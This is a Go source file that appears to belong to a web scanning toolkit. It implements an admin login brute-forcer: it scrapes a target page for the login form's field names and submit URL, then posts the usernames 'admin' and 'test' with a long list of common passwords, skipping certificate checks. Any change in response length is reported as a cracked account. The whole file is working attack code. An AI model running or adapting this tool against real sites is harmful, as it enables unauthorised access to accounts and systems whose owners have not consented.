package admin_brute

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"
)

var (
	usernames = []string{"admin", "test"}
	passwords = []string{"admin", "admin123", "password", "admin@123", "admin888", "root", "123456", "a123456", "123456a", "yinghuo", "5201314", "111111", "woaini1314", "qq123456", "123123", "000000", "1qaz2wsx", "1q2w3e4r", "qwe123", "7758521", "123qwe", "a123123", "123456aa", "woaini520", "woaini", "100200", "1314520", "woaini123", "123321", "q123456", "123456789", "123456789a", "5211314", "asd123", "a123456789", "z123456", "asd123456", "a5201314", "aa123456", "zhang123", "aptx4869", "123123a", "1q2w3e4r5t", "1qazxsw2", "5201314a", "1q2w3e", "aini1314", "31415926", "q1w2e3r4", "123456qq", "woaini521", "1234qwer", "a111111", "520520", "iloveyou", "abc123", "110110", "111111a", "123456abc", "w123456", "7758258", "123qweasd", "159753", "qwer1234", "a000000", "qq123123", "zxc123", "123654", "abc123456", "123456q", "qq5201314", "12345678", "000000a", "456852", "as123456", "1314521", "112233", "521521", "qazwsx123", "zxc123456", "abcd1234", "asdasd", "666666", "love1314", "QAZ123", "aaa123", "q1w2e3", "aaaaaa", "a123321", "123000", "11111111", "12qwaszx", "5845201314", "s123456", "nihao123", "caonima123", "zxcvbnm123", "wang123", "159357", "1A2B3C4D", "asdasd123", "584520", "753951", "147258", "1123581321", "110120", "qq1314520"}
	check_url string
	httpProxy string
)

func getinput() (usernamekey string, passwordkey string, domainurl string) {
	var tr *http.Transport
	if httpProxy != "" {
		uri, _ := url.Parse(httpProxy)
		tr = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			Proxy:           http.ProxyURL(uri),
		}
	} else {
		tr = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
	}
	client := &http.Client{
		Timeout:   time.Duration(60) * time.Second,
		Transport: tr,
	}

	req, err := http.NewRequest(strings.ToUpper("GET"), check_url, strings.NewReader(""))
	if err != nil {
		fmt.Println(err)
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
	}
	defer resp.Body.Close()
	var username = "username"
	var password = "password"
	var loginurl = check_url + "/login"
	data, _ := ioutil.ReadAll(resp.Body)
	userreg := regexp.MustCompile(`<input.*name="(name|user.*?|User.*?)".*>`)
	usernamelist := userreg.FindStringSubmatch(string(data))
	if usernamelist != nil {
		username = usernamelist[len(usernamelist)-1:][0]
	}

	passreg := regexp.MustCompile(`<input.*name="(pass.*?|Pass.*?)".*>`)
	passlist := passreg.FindStringSubmatch(string(data))
	if passlist != nil {
		password = passlist[len(passlist)-1:][0]
	}

	domainreg := regexp.MustCompile(`<form.*action="(.*?)"`)
	domainlist := domainreg.FindStringSubmatch(string(data))
	if domainlist != nil {
		domainx := domainlist[len(domainlist)-1:][0]
		if strings.Contains(domainx, "http") {
			loginurl = domainx
		} else if domainx == "" {
			loginurl = check_url
		} else if domainx[0:1] == "/" {
			u, _ := url.Parse(check_url)
			loginurl = u.Scheme + "://" + u.Host + domainlist[len(domainlist)-1:][0]
		} else {
			loginurl = check_url + "/" + domainlist[len(domainlist)-1:][0]
		}
	} else {
		domainreg2 := regexp.MustCompile(`url:.*?"(.*?)"`)
		domainlist2 := domainreg2.FindStringSubmatch(string(data))
		if domainlist2 != nil {
			domainx := domainlist2[len(domainlist2)-1:][0]
			if strings.Contains(domainx, "http") {
				loginurl = domainx
			} else if domainx == "" {
				loginurl = check_url
			} else if domainx[0:1] == "/" {
				u, _ := url.Parse(check_url)
				loginurl = u.Scheme + "://" + u.Host + domainlist2[len(domainlist2)-1:][0]
			} else {
				loginurl = check_url + "/" + domainlist2[len(domainlist2)-1:][0]
			}
		}
	}
	return username, password, loginurl
}

func httpRequset(postContent string, loginurl string) int64 {
	//设置跳过https证书验证，超时和代理
	var tr *http.Transport
	if httpProxy != "" {
		uri, _ := url.Parse(httpProxy)
		tr = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			Proxy:           http.ProxyURL(uri),
		}
	} else {
		tr = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		}
	}
	client := &http.Client{
		Timeout:   time.Duration(60) * time.Second,
		Transport: tr,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse //不允许跳转
		}}
	req, err := http.NewRequest(strings.ToUpper("POST"), loginurl, strings.NewReader(postContent))
	if err != nil {
		fmt.Println(err)
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36")
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
	}
	defer resp.Body.Close()
	return resp.ContentLength
}

func Check(url string) {
	check_url = url
	usernamekey, passwordkey, loginurl := getinput()
	wronglength := httpRequset(fmt.Sprintf("%s=admin&%s=7756ee93d3ac8037bf4d55744b93e08c", usernamekey, passwordkey), loginurl)
	for useri := range usernames {
		for passi := range passwords {
			length := httpRequset(fmt.Sprintf("%s=%s&%s=%s", usernamekey, usernames[useri], passwordkey, passwords[passi]), loginurl)
			if length != wronglength {
				fmt.Printf("爆破成功，账号:%s，密码:%s，登录地址:%s", usernames[useri], passwords[passi], loginurl)
				break
			}
		}
		break
	}
}
